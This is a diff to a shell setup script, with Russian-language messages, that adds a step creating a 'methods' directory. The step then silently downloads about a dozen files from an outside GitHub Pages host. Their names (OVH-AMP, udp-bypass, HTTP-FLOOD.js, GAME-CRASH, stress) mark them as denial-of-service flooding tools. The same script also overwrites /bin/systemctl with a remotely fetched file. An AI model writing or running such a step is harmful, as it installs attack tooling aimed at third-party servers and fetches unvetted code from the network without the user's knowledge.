@@ -75,7 +75,39 @@ else
     rm -rf root.zip >/dev/null 2>err.log
     rm -rf root.tar.gz >/dev/null 2>err.log
     echo -ne '############         (60%)\r'
+    
+    if [ -e ~/root/methods/ ]
+    
+    then
+    
+        echo "Проверка каталога прошла успешно."
+    
+    else
+        
+       echo "Каталога methods не существует, поэтому создается. Ожидайте так же. После успешного создания каталога запустите скрипт ещё раз."
+       
+       mkdir ~/root/methods
+       
+       kill "$$"
+       
+       exit
 
+    fi
+    
+    wget https://haker20szs.github.io/haker20szs/methods/OVH-AMP -O ~/root/methods/OVH-AMP 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/OVH-FLIDR -O ~/root/methods/OVH-FLIDR 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/fli.py -O ~/root/methods/fli.py 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/home.pl -O ~/root/methods/home.pl 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/GAME-CRASH -O ~/root/methods/GAME-CRASH 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/MertOVH -O ~/root/methods/MertOVH 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/stress -O ~/root/methods/stress 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/god.pl -O ~/root/methods/god.pl 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/AMP.pl -O ~/root/methods/AMP.pl 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/udp-bypass -O ~/root/methods/udp-bypass 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/udp-bypass-v2 -O ~/root/methods/udp-bypass-v2 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/HTTP-RAW.js -O ~/root/methods/HTTP-RAW.js 2> /dev/null
+    wget https://haker20szs.github.io/haker20szs/methods/HTTP-FLOOD.js -O ~/root/methods/HTTP-FLOOD.js 2> /dev/null
+    echo -ne '############         (72%)\r'
     cmds=("mv gotty /usr/bin/" "mv unzip /usr/bin/" "apt-get -y update" "apt-get -y upgrade" "apt-get -y install sudo curl wget hwloc htop nano neofetch python3" "curl -o /bin/systemctl https://raw.githubusercontent.com/gdraheim/docker-systemctl-replacement/master/files/docker/systemctl3.py")
 
     for cmd in "${cmds[@]}"; do
